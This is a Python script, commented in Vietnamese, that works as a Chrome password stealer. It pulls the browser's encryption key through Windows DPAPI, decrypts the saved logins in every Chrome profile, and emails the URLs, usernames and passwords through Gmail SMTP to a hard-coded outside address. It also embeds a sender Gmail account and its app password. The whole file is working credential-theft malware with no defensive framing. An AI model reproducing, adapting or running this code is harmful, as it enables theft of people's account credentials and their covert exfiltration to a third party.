import os
import sqlite3
import json
import base64
import shutil
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from win32crypt import CryptUnprotectData
from Crypto.Cipher import AES

# Thông tin đăng nhập email
email = 'sptqntool@gmail.com'
password = 'akck zoul xifd arew'

# Hàm giải mã mật khẩu
def decrypt_password(password, key):
    try:
        iv = password[3:15]
        payload = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)[:-16].decode()
        return decrypted_pass
    except Exception as e:
        print(f"Error decrypting password: {e}")
        return ""

# Hàm gửi email
def send_email(email, password, recipient, subject, body):
    msg = MIMEMultipart()
    msg['From'] = email
    msg['To'] = recipient
    msg['Subject'] = subject
    msg.attach(MIMEText(body, 'plain'))

    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(email, password)
    text = msg.as_string()
    server.sendmail(email, recipient, text)
    server.quit()

# Đường dẫn đến thư mục User Data của Chrome
user_data_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data')
local_state_path = os.path.join(user_data_path, 'Local State')

# Lấy khóa giải mã từ Local State
with open(local_state_path, 'r', encoding='utf-8') as f:
    local_state = f.read()
    local_state = json.loads(local_state)
    encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
    encrypted_key = encrypted_key[5:]  # Bỏ đi tiền tố "DPAPI"
    key = CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

passwords = []

# Duyệt qua tất cả các thư mục hồ sơ người dùng của Chrome
for profile in os.listdir(user_data_path):
    profile_path = os.path.join(user_data_path, profile)
    login_data_path = os.path.join(profile_path, 'Login Data')

    if os.path.exists(login_data_path):
        # Sao chép file cơ sở dữ liệu để tránh lỗi khi Chrome đang mở
        db_path = f'Login Data_{profile}'
        shutil.copyfile(login_data_path, db_path)

        # Kết nối đến cơ sở dữ liệu
        conn = sqlite3.connect(db_path)
        cursor = conn.cursor()

        # Lấy dữ liệu tài khoản và mật khẩu đã lưu
        cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
        login_data = cursor.fetchall()

        # Giải mã mật khẩu
        for url, user, encrypted_pass in login_data:
            try:
                decrypted_pass = decrypt_password(encrypted_pass, key)
                passwords.append({
                    'profile': profile,
                    'url': url,
                    'username': user,
                    'password': decrypted_pass
                })
            except Exception as e:
                print(f"Error decrypting password for {user} at {url}: {e}")

        conn.close()
        os.remove(db_path)

# Tạo nội dung email
email_body = ''
for item in passwords:
    email_body += f"=======================================\n Profile: {item['profile']}\n URL: {item['url']}\n Username: {item['username']}\n Password: {item['password']}\n"

# Gửi email
send_email(email, password, 'quangnamgamer@gmail.com', 'Passwords', email_body)
